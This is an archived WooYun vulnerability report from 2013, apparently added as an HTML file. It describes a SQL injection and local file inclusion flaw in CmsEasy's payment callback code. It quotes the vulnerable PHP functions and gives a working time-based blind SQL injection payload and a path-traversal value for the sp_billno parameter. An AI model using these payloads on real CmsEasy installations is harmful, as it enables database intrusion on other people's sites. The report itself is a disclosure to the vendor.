@@ -1,0 +1,242 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		cmseasy注入漏洞外送本地文件包含  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		cmseasy注入漏洞外送本地文件包含  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-10-21 15:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-24：	细节向第三方安全合作伙伴开放<br/>
+									2013-10-31：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-10：	细节向普通白帽子公开<br/>
+									2013-11-30：	细节向实习白帽子公开<br/>
+									2014-01-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">大神，求20我就满100成为普通白帽子了，再也不挖洞了，求满足，我有强迫症。。。还有麻烦把那个xss+csrf getshell审核下。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这次出问题的依然是通用函数。因为附带把包含漏洞写出来就选择了这个盲注。<br />
+<br />
+<br />
+<br />
+这个包含需要包含两次才能运用，不过最终还是不能截断（说了半天等于没说哈哈）。传说用很多个/截断，没成功，悲剧<br />
+<br />
+lib/default/archive_act.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>function respond_action() {<br />
+        include_once ROOT . &#039;/lib/plugins/pay/&#039; . front::$get[&#039;code&#039;] . &#039;.php&#039;; //GET过滤了,但是可以包含/pay/文件夹下的文件,code=tenpay,包含/lib/plugins/pay/tenpay.php<br />
+        $payclassname = front::$get[&#039;code&#039;];<br />
+        $payobj = new $payclassname(); 实例化tenpay类<br />
+        $uri = $_SERVER[&quot;REQUEST_URI&quot;];<br />
+        $__uriget = strstr($uri, &#039;?&#039;);<br />
+        $__uriget = str_replace(&#039;?&#039;, &#039;&#039;, $__uriget);<br />
+        $__uriget = explode(&#039;&amp;&#039;, $__uriget);<br />
+        $_GET = array(); //重置了GET<br />
+        foreach ($__uriget as $key =&gt; $val) {<br />
+            $tmp = explode(&#039;=&#039;, $val);<br />
+            $_GET[$tmp[0]] = $tmp[1]; //采用REQUEST_URI,可以正常引入GET不受过滤的影响。<br />
+            if(preg_match(&#039;/\&#039;|select|union|&quot;/i&#039;, $tmp1)){<br />
+            	exit(&#039;非法参数&#039;);<br />
+            }<br />
+        }<br />
+        $status = $payobj-&gt;respond(); //执行tenpay的respond方法,跟进0x01<br />
+......<br />
+    }</code></pre><p class='detail'><br />
+<br />
+lib/plugins/pay/tenpay.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>class tenpay {<br />
+   ......<br />
+    function respond() {<br />
+        require_once (&quot;tenpay/PayResponseHandler.class.php&quot;);<br />
+        $resHandler = new PayResponseHandler();<br />
+        $sp_billno = $resHandler-&gt;getParameter(&quot;sp_billno&quot;); //腾讯的函数,类似于$_GET[&#039;sp_billno&#039;]或者$_POST[&#039;sp_billno&#039;]<br />
+//上面谈到GET不受过滤影响，本地问价内包含POST，GET提交都可，但是注入的话必须提交POST，因为GET是URL码.<br />
+//sp_lillno=sp_billno=-1-1-../../../demo 包含根目录的demo.php<br />
+        preg_match_all(&quot;/-(.*)-(.*)-(.*)/isu&quot;,$sp_billno,$oidout);<br />
+        $paytype = $where[&#039;pay_code&#039;] = $oidout[3][0];<br />
+        include_once ROOT.&#039;/lib/plugins/pay/&#039;.$paytype.&#039;.php&#039;;//匹配上面正则就行，包含之，触发，但是实在找不到能截断的PHP文件了,所以鸡肋了。<br />
+        $pay = pay::getInstance()-&gt;getrows($where); //SQL注入，跟进0x02<br />
+    ......<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+lib/inc/table.php 0x02<br />
+<br />
+<br />
+<br />
+</p><pre><code>function getrow($condition,$order=&#039;1 desc&#039;,$cols=&#039;*&#039;) {<br />
+        $this-&gt;condition($condition); //OMG跟进,又是这个函数<br />
+        return $this-&gt;rec_select_one($condition,&#039;*&#039;,$order);<br />
+    }<br />
+ function condition(&amp;$condition) {<br />
+        if (isset($condition) &amp;&amp;is_array($condition)) {<br />
+            $_condition=array();<br />
+            foreach ($condition as $key=&gt;$value) {<br />
+                $value=str_replace(&quot;&#039;&quot;,&quot;\&#039;&quot;,$value);//这次是在这里,因为GPC的关系提交&#039;会被转移成\&#039;而程序员把&#039;替换成了\&#039;就变成了\\&#039;成功引入引号。还是好好改改这个函数吧。<br />
+                $_condition[]=&quot;`$key`=&#039;$value&#039;&quot;;<br />
+            }<br />
+            $condition=implode(&#039; and &#039;,$_condition);<br />
+        }<br />
+        ......<br />
+    }</code></pre><p class='detail'><br />
+<br />
+因为要引入引号，所以GET不行因为GET被重置为URL码了，这里用POST方法提交sp_billno<br />
+<br />
+-1-1-1-&#039; and if(1=1,BENCHMARK(1000000,MD5(1)),null)%23<br />
+<br />
+-1-1-1-&#039; and if(1=1,BENCHMARK(1000000,MD5(1)),null)%23<br />
+<br />
+SELECT * FROM `cmseasy_p_pay` WHERE `pay_code`=&#039;\\&#039; and if(1=1,BENCHMARK(1000000,MD5(1)),null) </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/211436351c563057a5a147371f83043bc7f321f0.jpg" target="_blank"><img src="../images/211436351c563057a5a147371f83043bc7f321f0.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/21143650772186f3b1d57e97c74db881efd0b10a.jpg" target="_blank"><img src="../images/21143650772186f3b1d57e97c74db881efd0b10a.jpg" alt="2.JPG" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/2114370086375416b10db4dec49d4db566ce9250.jpg" target="_blank"><img src="../images/2114370086375416b10db4dec49d4db566ce9250.jpg" alt="3.JPG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">最后求包养 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040521" title="cmseasy注入漏洞外送本地文件包含">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-10-21 15:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40521";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
